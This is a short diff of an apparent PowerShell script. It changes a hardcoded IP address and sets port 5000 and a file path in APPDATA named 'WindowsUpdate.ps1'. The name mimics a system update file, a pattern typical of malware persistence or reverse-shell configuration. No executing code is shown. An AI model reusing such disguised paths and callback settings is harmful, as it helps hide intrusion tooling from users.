@@ -1,4 +1,4 @@
-$ip = '192.168.17.201'
+$ip = '10.229.159.82'
 $port = 5000
 $path = "$env:APPDATA\WindowsUpdate.ps1"
 
